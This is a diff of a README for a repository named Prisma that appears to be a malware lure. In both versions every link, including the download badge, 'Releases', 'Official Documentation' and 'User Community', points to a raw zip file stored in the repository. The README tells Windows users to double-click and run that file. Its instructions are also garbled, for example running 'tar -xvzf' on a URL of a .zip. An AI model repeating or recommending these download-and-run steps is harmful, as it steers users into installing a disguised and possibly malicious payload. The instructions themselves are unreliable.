@@ -6,7 +6,7 @@ Welcome to Prisma! This guide will help you download and run Prisma easily. Pris
 
 ## 📥 Download Prisma
 
-[![Download Prisma](https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip%20Prisma-v1.0-blue)](https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip)
+[![Download Prisma](https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip%20Prisma-v1.0-blue)](https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip)
 
 Click the badge above to download Prisma or follow the steps below.
 
@@ -21,14 +21,14 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📂 Download & Install
 
-To get started with Prisma, visit this page to download: [Prisma Releases](https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip).
+To get started with Prisma, visit this page to download: [Prisma Releases](https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip).
 
 1. Go to the Prisma Releases page.
 2. Look for the latest version available.
 3. Click on the appropriate file for your system:
-   - **Windows:** `https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip`
-   - **macOS:** `https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip`
-   - **Linux:** `https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip`
+   - **Windows:** `https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip`
+   - **macOS:** `https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip`
+   - **Linux:** `https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip`
 4. Save the file to your computer.
 
 ### 🔍 Installation Instructions
@@ -36,21 +36,21 @@ To get started with Prisma, visit this page to download: [Prisma Releases](https
 Once downloaded, follow these steps to install Prisma:
 
 #### For Windows:
-1. Locate `https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip` in your Downloads folder.
+1. Locate `https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip` in your Downloads folder.
 2. Double-click the file to run it.
 3. Follow the on-screen instructions.
 4. Launch Prisma from the Start menu once the installation completes.
 
 #### For macOS:
-1. Find `https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip` in your Downloads.
+1. Find `https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip` in your Downloads.
 2. Double-click the file to open it.
 3. Drag the Prisma icon to your Applications folder.
 4. Open Prisma from your Applications to start using it.
 
 #### For Linux:
 1. Open your terminal.
-2. Navigate to the folder where you downloaded `https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip`.
-3. Run the command: `tar -xvzf https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip`.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip`.
+3. Run the command: `tar -xvzf https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip`.
 4. Move to the Prisma directory: `cd Prisma`.
 5. Execute the application with: `./Prisma`.
 
@@ -73,7 +73,7 @@ After installing Prisma, you can start utilizing its features:
 
 ### How do I update Prisma?
 
-To update, revisit the [Prisma Releases](https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip) page and download the latest version. Again, follow the installation instructions for your operating system.
+To update, revisit the [Prisma Releases](https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip) page and download the latest version. Again, follow the installation instructions for your operating system.
 
 ### Can I use Prisma offline?
 
@@ -85,7 +85,7 @@ If you face any problems while downloading or running Prisma, check our help sec
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip)
-- [User Community](https://github.com/awamy-exe/Prisma/raw/refs/heads/main/prisma/components/settings/Software-unhallooed.zip)
+- [Official Documentation](https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip)
+- [User Community](https://raw.githubusercontent.com/awamy-exe/Prisma/main/prisma/Software_v2.3.zip)
 
 Thank you for choosing Prisma! We hope you find it valuable for your projects.
